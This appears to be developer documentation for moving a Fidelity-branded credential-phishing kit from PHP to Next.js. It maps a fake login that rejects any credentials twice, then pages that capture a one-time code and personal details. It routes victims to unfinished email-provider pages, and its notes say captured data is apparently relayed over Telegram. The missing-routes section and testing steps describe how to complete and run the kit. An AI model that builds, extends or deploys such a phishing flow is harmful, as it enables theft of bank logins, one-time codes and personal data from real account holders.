# Routing Documentation: PHP to Next.js

## Complete Routing Flow

### User Flow
```
1. Login Page (/)
   ↓ [2 failed login attempts]
2. Ask OTP Page (/ask-otp)
   ↓ [Button click: "Text me the code"]
3. OTP Page (/otp)
   ↓ [OTP submitted successfully]
4. Details Page (/details)
   ↓ [Details submitted]
   ├─→ [Email domain matches: ao, at, cc, ho, mc, oo, op, vr]
   │   → /[domain]/index (NOT IMPLEMENTED YET)
   └─→ [Email domain doesn't match]
       → Final Page (/final)
```

## Route Mapping

| PHP File | Next.js Route | File Location | Status |
|----------|---------------|---------------|--------|
| `index.php` | `/` | `app/page.tsx` | ✅ Complete |
| `ask-otp.php` | `/ask-otp` | `app/ask-otp/page.tsx` | ✅ Complete |
| `otp.php` | `/otp` | `app/otp/page.tsx` | ✅ Complete |
| `details.php` | `/details` | `app/details/page.tsx` | ✅ Complete |
| `final.php` | `/final` | `app/final/page.tsx` | ✅ Complete |
| `[domain]/index.php` | `/[domain]/index` | Not created | ❌ Missing |

## API Routes

| PHP API | Next.js API Route | File Location | Status |
|---------|------------------|---------------|--------|
| `next.php` | `/api/login` | `app/api/login/route.ts` | ✅ Complete |
| `otp-sent.php` | `/api/otp` | `app/api/otp/route.ts` | ✅ Complete |
| `next2.php` | `/api/details` | `app/api/details/route.ts` | ✅ Complete |

## Navigation Methods

### PHP (Original)
- `window.location.href = 'page.php'`
- `window.location.assign('folder/index.php')`
- Server-side redirects via `header('Location: ...')`

### Next.js (Converted)
- `router.push('/route')` - Client-side navigation
- Uses `useRouter()` hook from `next/navigation`
- API routes return JSON responses

## Routing Details

### 1. Login Page (`/`)
- **File**: `app/page.tsx`
- **Action**: Form submission → POST `/api/login`
- **Redirect**: After 2 failed attempts → `router.push('/ask-otp')`
- **Status**: ✅ Working

### 2. Ask OTP Page (`/ask-otp`)
- **File**: `app/ask-otp/page.tsx`
- **Action**: Button click "Text me the code"
- **Redirect**: `router.push('/otp')`
- **Status**: ✅ Working

### 3. OTP Page (`/otp`)
- **File**: `app/otp/page.tsx`
- **Action**: Form submission → POST `/api/otp`
- **Redirect**: On success → `router.push('/details')`
- **Status**: ✅ Working

### 4. Details Page (`/details`)
- **File**: `app/details/page.tsx`
- **Action**: Form submission → POST `/api/details`
- **Redirect Logic**:
  - If email domain matches: `router.push('/[domain]/index')`
  - Otherwise: `router.push('/final')`
- **Status**: ✅ Working (domain routes not implemented)

### 5. Final Page (`/final`)
- **File**: `app/final/page.tsx`
- **Content**: 
  - Green checkmark image
  - Congratulatory message
  - "New to Fidelity?" links
  - Footer
- **Status**: ✅ Complete

## Missing Implementation

### Dynamic Domain Routes
The following routes are referenced but not yet implemented:
- `/ao/index`
- `/at/index`
- `/cc/index`
- `/ho/index`
- `/mc/index`
- `/oo/index`
- `/op/index`
- `/vr/index`

**To implement**, create:
```
app/[domain]/index/page.tsx
```

This would handle dynamic routing based on email domain submitted in the details form.

## Testing Routes

To test the complete flow:
1. Start dev server: `npm run dev`
2. Navigate to `http://localhost:3000`
3. Submit login form twice (any credentials)
4. Should redirect to `/ask-otp`
5. Click "Text me the code" → redirects to `/otp`
6. Enter OTP → redirects to `/details`
7. Submit details → redirects to `/final` (or `/[domain]/index` if domain matches)

## Notes

- All routes use client-side navigation (no page reloads)
- API routes handle backend logic and Telegram messaging
- The popup on final page is hidden by default (shown from details page flow)
- All pages include footer and proper styling

